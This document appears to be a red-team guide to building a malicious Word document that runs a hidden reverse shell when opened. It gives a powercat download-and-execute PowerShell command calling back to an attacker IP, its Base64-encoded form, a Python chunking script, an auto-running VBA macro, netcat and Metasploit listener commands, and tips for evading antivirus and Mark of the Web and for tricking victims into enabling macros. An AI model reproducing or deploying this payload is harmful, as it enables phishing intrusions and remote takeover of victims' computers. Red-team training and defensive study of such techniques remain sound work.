
> [!abstract] Malicious Office Macros (Initial Access)
> A comprehensive guide on crafting malicious Microsoft Word macros to gain initial access. This technique uses VBA scripting to execute PowerShell payloads, often chunked to bypass VBA's character limits and evade basic AV detections.
> 
> **MITRE ATT&CK Mapping:** [T1566.001 - Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) | [T1204.002 - User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)

## Step 1: Generate the Payload

> [!info]+ PowerShell Reverse Shell Payload
> First, create your PowerShell payload. In this example, we use `powercat` downloaded and executed in memory.
> 
> ```powershell
> # Powercat one-liner
> IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1");powercat -c <AttackerIP> -p 4444 -e powershell.exe
> ```
> 
> To make it stealthier and avoid blacklisted keywords, we wrap it in a hidden window and encode it to Base64 (UTF-16LE format, which PowerShell expects).
> 
> **Encode to Base64 (UTF-16LE) in Linux:**
> ```bash
> echo -n "IEX(New-Object System.Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\");powercat -c 10.10.10.10 -p 4444 -e powershell.exe" | iconv -t UTF-16LE | base64 -w 0
> ```

> [!tip]+ Python Chunking Script (Bypassing VBA Limits)
> VBA has a line length limit. To inject a long Base64 string, we must split it into 50-character chunks and concatenate them in the VBA code.
> 
> 1. Put your final command (`powershell.exe -nop -w hidden -e <BASE64>`) in a text file or variable.
> 2. Run this Python script to generate the VBA string chunks:
> ```python
> str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGIAZQBzAGkAbQBvAHIAaABpAG4AbwAvAHAAbwB3AGUAcgBjAGEAdAAvAG0AYQBzAHQAZQByAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAXAApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQA="
> n = 50
> for i in range(0, len(str), n):
>     print("Str = Str + " + '"' + str[i:i+n] + '"')
> ```
> 3. Copy the Python output. We will paste this into the macro in Step 3.

---

## Step 2: Create the Malicious Document

> [!example]+ Word Document Setup
> 1. Open Microsoft Word and create a new blank document.
> 2. Save the file as **Word 97-2003 Document (\*.doc)** (e.g., `payload.doc`). Older formats handle macros more seamlessly.
> 3. Go to the **View** tab on the ribbon.
> 4. Click on **Macros** -> **View Macros**.
> 5. Set the Macro name to: `MyMacro`
> 6. Set the "Macros in:" dropdown to your document name (`payload.doc`).
> 7. Click **Create**. This will open the VBA Editor.

---

## Step 3: Insert the VBA Macro Code

> [!danger]+ The VBA Payload Structure
> Replace the default code in the VBA editor with the following template. 
> 
> ```vba
> Sub AutoOpen()
>     MyMacro
> End Sub
> 
> Sub Document_Open()
>     MyMacro
> End Sub
> 
> Sub MyMacro()
>     Dim Str As String
>     
>     ' --- PASTE PYTHON OUTPUT HERE ---
>     ' Example:
>     ' Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGU"
>     ' Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAG"
>     ' ... (all chunks) ...
>     ' -------------------------------
>     
>     CreateObject("Wscript.shell").Run Str
> End Sub
> ```
> 
> **How it works:**
> - `AutoOpen()` and `Document_Open()` ensure the macro runs automatically as soon as the document is opened or enabled.
> - `Dim Str As String` initializes the variable.
> - The Python chunks concatenate to build the full PowerShell command.
> - `CreateObject("Wscript.shell").Run Str` executes the final command in the background.

---

## Step 4: Execution & Listener

> [!success]+ Catching the Shell
> Before sending the macro to the victim, ensure your listener is running.
> 
> **Netcat Listener:**
> ```bash
> nc -vnlp 4444
> ```
> 
> **Alternative: Metasploit Handler (if using msfvenom payloads):**
> ```ruby
> msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"
> ```

---

> [!warning] Operational Security (OPSEC) & Evasion Notes
> - **Mark of the Web (MotW):** If the document is downloaded from the internet, Windows will block macros by default. You may need to pack it in a ZIP, use an ISO, or use a payload delivery method that strips the MotW.
> - **AV Evasion:** Simple Base64 payloads are easily caught by Windows Defender. Consider encoding the payload with `msfvenom` using `shikata_ga_nai` or using tools like `SharpShooter` / `MacroPack`.
> - **Social Engineering:** The victim still needs to click "Enable Content" (Enable Editing/Enable Macros) for the VBA to execute.

